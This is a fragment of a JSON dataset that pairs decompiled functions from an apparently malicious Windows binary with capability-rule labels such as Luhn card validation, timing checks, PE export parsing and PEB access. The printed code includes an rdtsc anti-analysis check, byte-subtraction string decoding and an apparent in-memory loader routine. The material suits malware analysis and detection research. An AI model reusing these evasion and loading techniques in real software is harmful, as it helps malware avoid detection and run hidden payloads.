        "decompiled_code": "\nint32_t __cdecl fcn.00407808(int32_t arg_8h, int32_t arg_ch)\n\n{\n    return arg_ch * arg_ch * arg_ch + arg_8h * arg_8h * arg_8h;\n}\n",
        "token_count": 54
    },
    "00407842": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.00407842(uint *arg_8h, uint8_t *arg_ch, uint *arg_10h)\n\n{\n    uint var_bp_ch;\n    \n    *arg_ch = *arg_ch ^ *arg_8h * *arg_10h + 4U;\n    return;\n}\n",
        "token_count": 83
    },
    "0040789b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040789b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    *0x4129a8 = arg_8h;\n    *0x4129b0 = arg_10h;\n    *0x4129ac = arg_ch;\n    fcn.004078c8();\n    return;\n}\n",
        "token_count": 88
    },
    "00407d55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407d55(void)\n\n{\n    uint32_t in_EAX;\n    uint unaff_EBX;\n    uint32_t unaff_EBP;\n    \n    do {\n        *0x4129ac = unaff_EBP ^ in_EAX;\n        in_EAX = fcn.0040789b(unaff_EBX, unaff_EBP, &stack0x00000004);\n    } while( true );\n}\n",
        "token_count": 94
    },
    "00408277": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408277(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00409ddf();\n    fcn.0040806a(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 73
    },
    "004096c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid fcn.004096c6(void)\n\n{\n    uint64_t uVar1;\n    uchar auVar2 [12];\n    uchar auVar4 [16];\n    int32_t iStack144;\n    int32_t iStack136;\n    uchar auStack108 [64];\n    uint64_t auStack44 [4];\n    uint var_bp_4h;\n    uchar auVar3 [13];\n    uchar uVar5;\n    \n    iStack136 = 0;\n    do {\n        *(auStack44 + iStack136) = *(iStack136 + 0x4076b0) - *(iStack136 + 0x407719);\n        iStack136 = iStack136 + 1;\n        iStack144 = 0;\n    } while (iStack136 != 0xb);\n    do {\n        uVar1 = *(auStack44 + iStack144);\n        uVar5 = SUB141(ZEXT814(uVar1) >> 0x30, 0);\n        auVar3 = ZEXT813(uVar1);\n        auVar2 = ZEXT812(uVar1);\n        auVar4 = psraw(CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(SUB1610(\n                                                            CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(\n                                                            SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313(SUB163(\n                                                            CONCAT214(SUB162(CONCAT115(SUB161(ZEXT816(uVar1) >> 0x38, 0)\n                                                                                       , CONCAT114(SUB151(ZEXT815(uVar1)\n                                                                                                          >> 0x38, 0), \n                                                                                                   ZEXT814(uVar1))) >>\n                                                                             0x70, 0), CONCAT113(uVar5, auVar3)) >> 0x68\n                                                            , 0), CONCAT112(uVar5, auVar2)) >> 0x60, 0), \n                                                            CONCAT111(SUB131(auVar3 >> 0x28, 0), ZEXT811(uVar1))) >>\n                                                            0x58, 0), CONCAT110(SUB121(auVar2 >> 0x28, 0), uVar1)) >>\n                                                            0x50, 0), CONCAT19(SUB131(auVar3 >> 0x20, 0), uVar1)) >>\n                                                            0x48, 0), CONCAT18(SUB121(auVar2 >> 0x20, 0), uVar1)) >>\n                                                            0x40, 0), (uVar1 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (uVar1 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (uVar1 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (uVar1 >> 0x10) << 0x20) >> 0x20, 0), (uVar1 >> 8) << 0x18)\n                                                           >> 0x18, 0), (uVar1 >> 8) << 0x10) >> 0x10, 0), \n                                 uVar1 & 0xff | uVar1 << 8), 8);\n        *(auStack108 + iStack144 * 2) = auVar4;\n        iStack144 = iStack144 + 8;\n    } while (iStack144 != 0x20);\n    fcn.004082a4(auStack108, 0);\n    return;\n}\n",
        "token_count": 828
    },
    "00407d85": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n// WARNING: Removing unreachable block (ram,0x00407e10)\n\nint32_t __cdecl fcn.00407d85(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_bp_8h;\n    \n    iVar1 = *0x412a4c;\n    if (arg_10h == 0) {\n        iVar1 = arg_10h;\n    }\n    *0x4129a0 = arg_8h;\n    *0x4129ac = arg_ch;\n    *0x4129b0 = arg_10h;\n    return iVar1;\n}\n",
        "token_count": 161
    },
    "00409542": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nbool __fastcall fcn.00409542(uint32_t param_1, uint32_t param_2)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    uint32_t uVar3;\n    uint32_t uStack48;\n    int32_t iStack44;\n    uint32_t uStack40;\n    uint var_bp_ch;\n    \n    iStack44 = 0;\n    uStack48 = param_2;\n    uStack40 = param_1;\n    do {\n        uVar1 = rdtsc();\n        uVar2 = rdtsc();\n        uVar3 = uVar2 - uVar1;\n        if (iStack44 == 0) {\n            uStack48 = uVar3;\n            uStack40 = uVar3;\n        }\n        if (uVar3 < uStack48) {\n            uStack48 = uVar3;\n        }\n        if (uStack40 < uVar3) {\n            uStack40 = uVar3;\n        }\n        iStack44 = iStack44 + 1;\n    } while (iStack44 != 100);\n    return uStack40 == uStack48 && (uStack48 == 0 || (uStack48 == 0x53 || uStack48 == 3));\n}\n",
        "token_count": 287
    },
    "00408295": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.00408295(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    return *(*(in_FS_OFFSET + 0x18) + 0x30);\n}\n",
        "token_count": 40
    },
    "0040916a": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040916a(int32_t *arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t arg_8h_00;\n    int32_t iVar4;\n    int32_t iStack132;\n    int32_t iStack128;\n    uint32_t uStack104;\n    char acStack100 [32];\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    int32_t iStack48;\n    int32_t iStack44;\n    uint uStack40;\n    uint uStack36;\n    uint32_t uStack28;\n    uint uStack24;\n    \n    uStack28 = 0x1057b3bd;\n    iStack68 = 0x6b5d571;\n    iStack52 = 0;\n    iStack44 = 0;\n    do {\n        uStack24 = 0x1057b3bd;\n        iStack64 = *(iStack44 * 0x22c + 0x40b228) + iStack52 + *(iStack44 * 0x22c + 0x40b158);\n        iStack44 = iStack44 + 1;\n        iStack128 = 0;\n        iStack52 = iStack64;\n    } while (iStack44 != 0x38);\n    do {\n        acStack100[iStack128] = *(iStack128 + 0x4076e1) - *(iStack128 + 0x407719);\n        iStack128 = iStack128 + 1;\n    } while (iStack128 != 0xe);\ncode_r0x00409219:\n    uVar2 = fcn.00409ddf();\n    pcVar3 = fcn.0040806a(uVar2, acStack100);\n    arg_8h_00 = (*pcVar3)(0, iStack64, 0x1000, 0x1057b3c1 - uStack28);\n    *arg_8h = arg_8h_00 + 0x5dc2;\n    arg_8h[1] = 0x12a00;\n    uStack36 = 0;\n    uStack40 = 0x5a2d00ef;\n    uStack104 = uStack28 ^ 0x1057b3bd;\n    arg_8h[2] = arg_8h_00 + 0x177c;\n    arg_8h[3] = uStack28 + 0xefa88ef3;\n    uStack24 = 0xbd000000;\n    iStack132 = 0;\n    do {\n        iStack48 = iStack132;\n        puVar1 = *(iStack132 * 0x22c + 0x40b15c);\n        iVar4 = *(iStack132 * 0x22c + 0x40b228);\n        iStack56 = *(iStack132 * 0x22c + 0x40b158);\n        *(uStack104 + arg_8h_00) = *puVar1;\n        iStack56 = iStack56 + iVar4;\n        iStack60 = 0;\n        if (iStack56 != 0) {\n            do {\n                uStack24 = 0x19fab8ae;\n                (uStack104 + arg_8h_00)[iStack60] = puVar1[iStack60];\n                iVar4 = iStack60 + 1;\n                if (iStack68 - (uStack28 ^ 0x403b12c1) < 0x3eda2a16) goto code_r0x00409219;\n                iStack60 = iVar4;\n            } while (iVar4 != iStack56);\n        }\n        uVar2 = fcn.00409ddf();\n        fcn.0040806a(uVar2, acStack100);\n        iStack132 = iStack48 + 1;\n        uStack104 = iStack56 + uStack104;\n        if (iStack132 == 0x38) {\n            fcn.00408717(arg_8h_00, arg_8h_00, iStack64);\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 952
    }
}